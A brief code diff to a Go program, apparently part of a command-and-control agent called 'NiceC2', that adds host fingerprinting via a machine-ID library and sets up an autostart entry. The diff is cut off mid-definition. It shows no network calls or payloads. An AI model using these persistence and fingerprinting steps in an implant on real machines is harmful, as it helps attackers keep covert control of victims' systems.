@@ -1,12 +1,18 @@
 package main
 
 import (
+	"fmt"
 	"log"
 
+	"github.com/denisbrodbeck/machineid"
 	"github.com/emersion/go-autostart"
 )
 
 func main() {
+
+	// NodeID := generateGUID()
+	NodeID, _ := machineid.ID()
+	fmt.Println(NodeID)
 
 	app := &autostart.App{
 		Name:        "NiceC2",
